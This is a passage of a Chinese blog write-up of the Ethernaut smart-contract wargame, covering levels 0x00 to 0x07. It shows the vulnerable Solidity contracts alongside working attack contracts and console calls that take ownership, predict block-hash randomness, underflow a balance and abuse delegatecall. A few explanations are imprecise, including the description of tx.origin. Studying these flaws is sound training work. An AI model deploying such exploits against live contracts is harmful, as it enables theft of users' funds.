@@ -1,0 +1,822 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>Ethernaut Writeup | </title>
+    <meta name="author" content="ssj">
+    
+    <meta name="description" content="这ethernaut是一个由以太坊智能合约经典漏洞组成的实战wargame，比较适合刚入坑的新手。
+
+0x00 Hello Ethernaut这个试试metamask的，按照提示走即可。（这小狐狸是真**可爱）
+0x01 fallback这个是熟悉平台用的签到题，分析代码，contribute()的">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Ethernaut Writeup">
+    <meta property="og:site_name" content="ssj&#39;s blog">
+
+    
+    <meta property="og:image" content>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="ssj&#39;s blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tranquil-heart.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+</html>
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="pink accent-1">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">ssj&#39;s blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav pink darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="/favicon.png" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">ssj</p>
+                        <p class="desc"></p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav pink darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CTF/">
+                    CTF <span class="right">6</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CTF/Android/">
+                    Android <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CTF/pwn/">
+                    pwn <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Ethereum/">
+                    Ethereum <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Android/">
+                    Android <span class="right">10</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/马甲包/">
+                    马甲包 <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/CVE/">
+                    CVE <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/Android/脱壳/">
+                    脱壳 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/算法/">
+                    算法 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/面试体验/">
+                    面试体验 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/面试体验/Android/">
+                    Android <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/听戏/">
+                    听戏 <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CVE/">
+                    CVE <span class="right">13</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CVE/v8/">
+                    v8 <span class="right">2</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CVE/Base/">
+                    Base <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CVE/VM/">
+                    VM <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/CVE/Docs/">
+                    Docs <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/基础知识/">
+                    基础知识 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/二进制漏洞/">
+                    二进制漏洞 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Cpp/">
+                    Cpp <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper pink">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/Ethereum/">Ethereum</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Ethernaut Writeup</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2019-03-25T11:25:47.000Z"><a href="/2019/03/25/Ethereum-practices/">2019-03-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Ethereum/" class="chip pink lighten-1">Ethereum</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-Hello-Ethernaut"><span class="section table-of-contents-text">0x00 Hello Ethernaut</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-fallback"><span class="section table-of-contents-text">0x01 fallback</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-Fallout"><span class="section table-of-contents-text">0x02 Fallout</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-Coin-Flip"><span class="section table-of-contents-text">0x03 Coin Flip</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-Telephone"><span class="section table-of-contents-text">0x04 Telephone</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-Token"><span class="section table-of-contents-text">0x05 Token</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-Delegation"><span class="section table-of-contents-text">0x06 Delegation</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x07-Force"><span class="section table-of-contents-text">0x07 Force</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x08-Vault"><span class="section table-of-contents-text">0x08 Vault</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x09-King"><span class="section table-of-contents-text">0x09 King</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x0A-Re-entrancy"><span class="section table-of-contents-text">0x0A Re-entrancy</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x0B-Elevator"><span class="section table-of-contents-text">0x0B Elevator</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x0C-Privacy"><span class="section table-of-contents-text">0x0C Privacy</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x0D-GatekeeperOne"><span class="section table-of-contents-text">0x0D GatekeeperOne</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x0E-GatekeeperTwo"><span class="section table-of-contents-text">0x0E GatekeeperTwo</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#00x0F-Naught-Coin"><span class="section table-of-contents-text">00x0F Naught Coin</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x10-Preservation"><span class="section table-of-contents-text">0x10 Preservation</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x11-Locked"><span class="section table-of-contents-text">0x11 Locked</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x12-Recovery"><span class="section table-of-contents-text">0x12 Recovery</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x13-MagicNumber"><span class="section table-of-contents-text">0x13 MagicNumber</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x14-Alien-Codex"><span class="section table-of-contents-text">0x14 Alien Codex</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x15-Denial"><span class="section table-of-contents-text">0x15 Denial</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x16-Shop"><span class="section table-of-contents-text">0x16 Shop</span></a></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <blockquote>
+<p>这<a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">ethernaut</a>是一个由以太坊智能合约经典漏洞组成的实战wargame，比较适合刚入坑的新手。</p>
+</blockquote>
+<h2 id="0x00-Hello-Ethernaut"><a href="#0x00-Hello-Ethernaut" class="headerlink" title="0x00 Hello Ethernaut"></a>0x00 Hello Ethernaut</h2><p>这个试试metamask的，按照提示走即可。（这小狐狸是真**可爱）</p>
+<h2 id="0x01-fallback"><a href="#0x01-fallback" class="headerlink" title="0x01 fallback"></a>0x01 fallback</h2><p>这个是熟悉平台用的签到题，分析代码，contribute()的意思是一次只能转小于0.001ether，贡献大于1000ether时可以成为owner，但是每次转账操作后都会调用fallback函数，它的fallback函数看一下可以直接让你成为owner，然后调用withdraw()把钱转走，结束。</p>
+<blockquote>
+<p>contract.contribute({value: 1})</p>
+</blockquote>
+<blockquote>
+<p>contract.sendTransaction({value: 1})</p>
+</blockquote>
+<blockquote>
+<p>contract.withdraw()</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    //我没看明白总觉得写错了。</span><br><span class="line">    //噢我知道了，只有合约生成的时候才调用构造函数。</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Fallout"><a href="#0x02-Fallout" class="headerlink" title="0x02 Fallout"></a>0x02 Fallout</h2><p>这**有意思，要好眼力啊！orz。</p>
+<p><strong>现在构造函数不允许这么写了，要写成constructor () {}</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &apos;zeppelin-solidity/contracts/ownership/Ownable.sol&apos;;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  //这愚蠢的土拨鼠，这不是构造函数，直接调啊！还来个注释，可爱死了。。。</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Coin-Flip"><a href="#0x03-Coin-Flip" class="headerlink" title="0x03 Coin Flip"></a>0x03 Coin Flip</h2><p>这是一个猜硬币的，要连续猜对10次，典型的区块链随机数问题。出题人用<code>block.blockhash(block.number-1)</code>生成随机数，我们可以部署一个新的合约，先预测随机数，再猜。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 <span class="keyword">public</span> consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">  constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">flip</span><span class="params">(bool _guess)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是</span></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = <span class="number">0x09698a52AEA77e02ef4c5E7fD56d4494Ae2e6B13</span>;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//按照它的算法算一波</span></span><br><span class="line">  <span class="function">function <span class="title">predict</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(bool)</span></span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-<span class="number">1</span>));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    <span class="keyword">return</span> coinFlip == <span class="number">1</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>猜10次也是要了命了……鬼知道我交了金猪？</p>
+<h2 id="0x04-Telephone"><a href="#0x04-Telephone" class="headerlink" title="0x04 Telephone"></a>0x04 Telephone</h2><p>这题的考点是tx.origin是合约的发布者，msg.sender是合约的调用者。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = 0x326B80841E0aFD792374E5604E63486303F2913D;</span><br><span class="line">    Telephone target = Telephone(instance_address);</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Token"><a href="#0x05-Token" class="headerlink" title="0x05 Token"></a>0x05 Token</h2><p>此题考点是上溢。调一下transfer，value给21就行了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     *此处应写为</span><br><span class="line">     *require(balances[msg.sender]&gt;=_value);</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-Delegation"><a href="#0x06-Delegation" class="headerlink" title="0x06 Delegation"></a>0x06 Delegation</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract WalletLibaray &#123;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    <span class="function">function <span class="title">WalletLibaray</span><span class="params">(address _owner)</span> </span>&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">initWallet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    WalletLibaray _walletLib;</span><br><span class="line">    <span class="function">function <span class="title">Wallet</span><span class="params">(address _walletLibAddress)</span> </span>&#123;</span><br><span class="line">        _walletLib = WalletLibaray(_walletLibAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        <span class="keyword">if</span> (_walletLib.delegatecall(msg.data)) &#123;</span><br><span class="line">            <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题是关于delegatecall的。看一下它的文档。</p>
+<blockquote>
+<p>There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.</p>
+</blockquote>
+<p>关于这题，要理解这么两点：</p>
+<p>1.delegatecall调用外部合约，上下文是被调用合约。delegatecall的参数可控，可以利用它调用那个pwn()。</p>
+<p>2.关于如何利用msg.data调用被调用合约中的函数。这块可以看看编译器对solidity的函数分发实现。msg.data头4个byte是被调用方法的签名哈希，调用函数是向合约账户地址发送msg.data[0:4]，然而就执行函数了，我们只需要获得pwn()的签名哈希，就可以执行pwn()了。</p>
+<p>获得pwn()签名哈希的方法。</p>
+<p>1）写一个假pwn()，调用它，就拥有pwn()的签名哈希了。<br>2）{data: web3.sha3(“pwn()”).slice(0,10)}，这样获得。</p>
+<p>然后随便调一调，触发fallback，就可以触发pwn。</p>
+<h2 id="0x07-Force"><a href="#0x07-Force" class="headerlink" title="0x07 Force"></a>0x07 Force</h2><p>喵了个咪？此题考点，合约自杀时将自己的钱强制给别人。</p>
